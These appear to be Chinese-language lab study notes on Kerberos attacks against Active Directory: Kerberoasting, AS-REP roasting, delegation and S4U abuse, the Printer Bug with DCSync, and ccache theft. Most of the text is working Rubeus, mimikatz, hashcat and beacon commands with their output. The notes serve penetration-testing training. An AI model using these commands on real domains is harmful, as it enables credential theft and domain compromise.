# Kerberos

kerberos验证流程

![alt Kerberos](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/overview.png?width=1920)


# Kerberoasting

请求SPN

## 请求所有SPN

1. Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

[*] Action: Kerberoasting
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 2

$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io*$[...hash...]
```

2. ADSearch.exe
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] cn : krbtgt
    [+] cn : MS SQL Service
    [+] cn : Honey Service
```


3. BloodHound
```
MATCH (u:User {hasspn:true}) RETURN u
```

显示到达存在这些用户SPN的计算机的攻击路径
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

## 请求单个用户的SPN，使用参数/user

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

[*] Action: Kerberoasting

[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
```

## 破解SPN的哈希

1. john
```
john --format=krb5tgs --wordlist=wordlist svc_mssql
```

2. hashcat
```
hashcat -a 0 -m 13100 svc_mssql wordlist
```


# AS-REP Roasting

关闭kerberos预认证的用户

## 查找关闭kerberos预认证的用户

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [+] cn                : Oracle Service
    [+] distinguishedname : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
    [+] samaccountname    : svc_oracle
```

2. BloodHound
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

3. Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:F3B1A1 [...snip...] D6D049
```

## 破解

1. john
```
john --format=krb5asrep --wordlist=wordlist svc_oracle
```

2. hashcat
```
hashcat -a 0 -m 18200 svc_oracle wordlist 
```


# 非约束委派


## 搜索非约束委派计算机

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] samaccountname     : DC-2$
    [+] dnshostname        : dc-2.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter

    [+] samaccountname     : SRV-1$
    [+] dnshostname        : srv-1.dev.cyberbotic.io
    [+] operatingsystem    : Windows Server 2016 Datacenter
```

2.  BloodHound
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```


## 监听TGT

DC本身总是设置为非约束委派

无约束委托的一个有趣方面是，无论用户正在访问哪个服务，它都会缓存用户的 TGT。

如果管理员访问使用 Kerberos 的计算机上的文件共享或任何其他服务，他们的 TGT 将被缓存

在普通机器上，比如我们现在```srv-1```这台机器上，如果我们通过非约束委派获得了这台机器的权限，就可以在机器的内存中寻找TGT，并且利用其来模拟用户

使用Rubeus监听所有新生成的TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10

[*] Action: TGT Monitoring
[*] Target user     : nlamb
[*] Monitoring every 10 seconds for new TGTs
```

此时如果我们访问```WKSTN-2```，并运行命令```dir \\srv-1\c$```，上面的监听就会产生nlamb的TGT

```
[*] 3/9/2021 11:33:52 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 11:32:10 AM
  EndTime               :  3/9/2021 9:32:10 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZz [...snip...] 5JTw==


[*] Ticket cache size: 1
```


将 base64 解码后的字符串写入.kirbi攻击机器上的文件，创建一个登录session，使用ptt（pass the ticket）访问DC
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```



用powershell根据tgt制作ticket
```
[IO.File]::WriteAllBytes("绝对路径\TGS\ticket.kirbi", [Convert]::FromBase64String("得到的base64"))
```

# The "Printer Bug"

如果一台机器配置了非约束委派（比如srv-1），可以利用Printer Bug强制任何机器（包括DC）向这台机器进行身份验证，从而使得srv-1获得DC的tgt

方法步骤：

1. 在srv-1上开启监听
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Target user     : DC-2$
[*] Monitoring every 10 seconds for new TGTs
```

2. 在WKSTN-1使用SpoolSample.exe强制dc-2这台机器向srv-1进行身份验证
```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

参数解释：
```
dc-2 is the "target" server

srv-1 is the "capture" server

```

3. srv-1的监听会收到dc-2的TGT
```
[*] 3/9/2021 12:00:07 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 10:27:15 AM
  EndTime               :  3/9/2021 8:27:13 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFLz [...snip...] MuSU8=

[*] Ticket cache size: 1
```

4. 利用dc-2的TGT伪造票据，然后再dc-2上执行dcsync

```
beacon> make_token DEV\DC-2$ FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```

# Constrained Delegation

约束委派的机器不允许缓存其他用户的 TGT，但允许它用自己的TGT为其他用户请求TGS。

## 查找约束委派计算机

1. ADSearch
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "cn": "SRV-2",
    "dnshostname": "srv-2.dev.cyberbotic.io",
    "samaccountname": "SRV-2$",
    "msds-allowedtodelegateto": [
      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "eventlog/dc-2.dev.cyberbotic.io",
      "eventlog/DC-2",
      "eventlog/dc-2.dev.cyberbotic.io/DEV",
      "eventlog/DC-2/DEV",
      "cifs/wkstn-2.dev.cyberbotic.io",
      "cifs/WKSTN-2"
    ]
  }
]
```

2. BloodHound

```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

注意，约束委派可以是机器账号和用户账号，确保搜索两者。


## 执行委托


1. Rubeus

```
beacon> run hostname
srv-2

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/5/2021 8:06:05 AM |
 | [...snip...]                                                                                                |
 --------------------------------------------------------------------------------------------------------------- 

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

2. mimikatz
```
beacon> mimikatz sekurlsa::ekeys

[...snip...]
       aes256_hmac       babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
       rc4_hmac_nt       6df89604703104ab6e938aee1d23541b

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

[*] Action: Ask TGT

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[!] Pre-Authentication required!
[!]	AES256 Salt: DEV.CYBERBOTIC.IOhostsrv-2.dev.cyberbotic.io
[*] Using aes256_cts_hmac_sha1 hash: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[*] Using domain controller: 10.10.17.71:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=
```


## 使用 TGT，执行 S4U 请求以获得 CIFS 的可用 TGS

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
```

参数解释
```
/impersonateuser is the user we want to impersonate. nlamb is a domain admin but you want to ensure this user has local admin access to the target (WKSTN-2).
/msdsspn is the service principal name that SRV-2 is allowed to delegate to.
/user is the principal allowed to perform the delegation.
/ticket is the TGT for /user.
```

把上面命令保存成CIFS的票据

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
```

载入票据
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cifs.kirbi
```

访问文件系统,这里切记使用完整的计算机名称
```
beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
```

否则会报1326
```
beacon> ls \\wkstn-2\c$
[*] Tasked beacon to list files in \\wkstn-2\c$
[+] host called home, sent: 54 bytes
[-] could not open \\wkstn-2\c$\*: 1326
```

# Alternate Service Name

这个就是约束委派的一个具体例子

原文：
> The eventlog service on DC-2 is not immediately useful for lateral movement, but the service name is not validated in s4u. This means we can request a TGS for any service run by DC-2$, using /altservice flag in Rubeus.


我的理解是，一台存在约束委派的计算机，可以利用Rubeus.exe通过指定指定flag ```/altservice```去访问任意服务。在这个例子里，本来是委派了eventlog服务，现在通过命令我们可以访问cifs服务。

命令
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLD [...snip...] MuSU8=

[*] Action: S4U

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[+] Sequence number is: 1421721239
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfj [...snip...] WLTIk

[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.dev.cyberbotic.io'
[*]   Final tickets will be for the alternate services 'cifs'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building S4U2proxy request for service: 'eventlog/dc-2.dev.cyberbotic.io'
[+] Sequence number is: 1070349348
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGvD [...snip...] ljLmlv

[+] Ticket successfully imported!
```

参数解释：
/msdsspn ： 就是原来委派的一个服务，这里是```eventlog/dc-2.dev.cyberbotic.io```
/altservice : 这里换成了委派的另一个服务```cifs```，这样就可以访问dc-2的文件系统了


现在可以访问```dc-2```的文件系统
```
beacon> ls \\dc-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 16:49:25   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/21/2021 11:20:15   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     02/17/2021 18:50:37   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/09/2021 10:26:16   pagefile.sys
```


# S4U2self Abuse

前提：拥有计算机的 RC4、AES256 或 TGT

滥用 S4U2self extension - 如果我们拥有域计算机的 RC4、AES256 或 TGT，则可以访问域计算机

我理解跟上面的原理是一样的，这里是使用了一个```Asn1Editor```工具把原本是```WKSTN-2$```的服务改成了```cifs/wkstn-2.dev.cyberbotic.io```，然后就可以访问wkstn-2.dev.cyberbotic.io的文件服务（cifs）

修改前：
```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  WKSTN-2$
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

修改后(注意ServiceName的值)：
```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

访问文件服务：
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

beacon> ls \\wkstn-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:43:43   Program Files
          dir     02/16/2022 12:46:57   Program Files (x86)
          dir     01/20/2022 16:46:38   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 14:45:10   System Volume Information
          dir     05/05/2021 16:13:00   Users
          dir     05/06/2021 09:35:17   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     02/28/2022 09:30:57   pagefile.sys
```

# Linux Credential Cache

提取域内linux机器的凭据

ccache files存储在```/tmp```目录下，注意它们都以```krb5cc```开头
```
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 jking      domain users 1342 Mar  9 15:21 krb5cc_1394201122_MerMmG
-rw------- 1 svc_oracle domain users 1341 Mar  9 15:33 krb5cc_1394201127_NkktoD
```

需要root权限才能下载上面的文件，如果没有root权限，先提权

下载到本地以后，使用 Impacket把上面的文件转成kirbi格式
```
root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```


Cobalt Strike也有一个转kirbi的命令，但是在这个例子里，好像不能识别
```
beacon> kerberos_ccache_use C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
[-] Could not extract ticket from C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
```


ptt,访问srv-2
```
beacon> make_token DEV\jking FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     03/09/2021 12:32:56   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/09/2021 12:30:35   pagefile.sys
```